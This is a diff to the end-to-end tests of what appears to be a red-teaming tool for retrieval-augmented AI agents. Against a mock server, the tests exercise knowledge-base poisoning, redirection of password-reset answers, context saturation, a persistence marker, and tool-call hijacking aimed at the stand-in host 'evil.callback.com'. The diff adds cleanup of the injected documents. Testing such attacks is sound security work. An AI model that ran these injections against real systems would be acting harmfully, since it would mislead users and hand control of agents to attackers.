@@ -19,7 +19,8 @@ from ragdrag.core.hijack import (
     assess_persistence,
     run_hijack,
 )
-from ragdrag.core.poison import InjectedDocument, inject_document
+from ragdrag.core.poison import CleanupStrategy, InjectedDocument, inject_document
+from ragdrag.engine.mutations import MutationLedger
 
 
 # --- Mock agentic server (ingestible + tool calls) ---
@@ -90,48 +91,60 @@ def _client():
 
 TARGET = "http://testserver/chat"
 INGEST = "http://testserver/ingest"
+CLEANUP = CleanupStrategy("http://testserver/documents/{id}")
+
+
+@pytest.fixture
+def mutation_controls():
+    yield {"mutations": MutationLedger(), "cleanup_strategy": CLEANUP}
 
 
 class TestRetrievalRedirectionE2E:
-    def test_redirect_password_reset(self):
+    def test_redirect_password_reset(self, mutation_controls):
         with _client() as client:
-            findings = redirect_retrieval(TARGET, client, ingest_url=INGEST)
+            findings = redirect_retrieval(
+                TARGET, client, ingest_url=INGEST, **mutation_controls,
+            )
             injection_findings = [f for f in findings if f.technique_id == "RD-0401"]
             redir_findings = [f for f in findings if f.technique_id == "RD-0501"]
             assert len(injection_findings) >= 1
             assert len(redir_findings) >= 1
 
-    def test_redirect_with_camouflage(self):
+    def test_redirect_with_camouflage(self, mutation_controls):
         with _client() as client:
             findings = redirect_retrieval(
                 TARGET, client, ingest_url=INGEST, use_camouflage=True,
+                **mutation_controls,
             )
             assert any(f.technique_id == "RD-0401" for f in findings)
 
 
 class TestContextSaturationE2E:
-    def test_saturate_security_topic(self):
+    def test_saturate_security_topic(self, mutation_controls):
         with _client() as client:
             findings = saturate_context_window(
                 TARGET, client, "security", num_documents=3, ingest_url=INGEST,
+                **mutation_controls,
             )
             injection_findings = [f for f in findings if f.technique_id == "RD-0401"]
             assert len(injection_findings) >= 1
 
-    def test_saturation_measured(self):
+    def test_saturation_measured(self, mutation_controls):
         with _client() as client:
             findings = saturate_context_window(
                 TARGET, client, "security", num_documents=3, ingest_url=INGEST,
+                **mutation_controls,
             )
             sat_findings = [f for f in findings if f.technique_id == "RD-0502"]
             assert len(sat_findings) >= 1
 
 
 class TestToolManipulationE2E:
-    def test_inject_tool_trigger(self):
+    def test_inject_tool_trigger(self, mutation_controls):
         with _client() as client:
             findings = manipulate_tool_calls(
                 TARGET, client, "evil.callback.com", ingest_url=INGEST,
+                **mutation_controls,
             )
             assert any(f.technique_id == "RD-0401" for f in findings)
             tool_findings = [f for f in findings if f.technique_id == "RD-0503"]
@@ -139,12 +152,12 @@ class TestToolManipulationE2E:
 
 
 class TestPersistenceE2E:
-    def test_injected_content_persists(self):
+    def test_injected_content_persists(self, mutation_controls):
         with _client() as client:
             _, doc = inject_document(
                 TARGET, client,
                 "PERSISTENT MARKER: This content should remain in the knowledge base across queries.",
-                ingest_url=INGEST,
+                ingest_url=INGEST, **mutation_controls,
             )
             assert doc is not None
 
@@ -154,18 +167,18 @@ class TestPersistenceE2E:
 
 
 class TestRunHijackE2E:
-    def test_full_hijack_run(self):
+    def test_full_hijack_run(self, mutation_controls):
         with _client() as client:
             result = run_hijack(
                 TARGET, client,
                 callback_url="evil.callback.com",
-                ingest_url=INGEST,
+                ingest_url=INGEST, **mutation_controls,
             )
             assert len(result.findings) >= 2
             assert result.target == TARGET
 
-    def test_hijack_result_serializes(self):
+    def test_hijack_result_serializes(self, mutation_controls):
         with _client() as client:
-            result = run_hijack(TARGET, client, ingest_url=INGEST)
+            result = run_hijack(TARGET, client, ingest_url=INGEST, **mutation_controls)
             d = result.to_dict()
             assert isinstance(d["findings"], list)
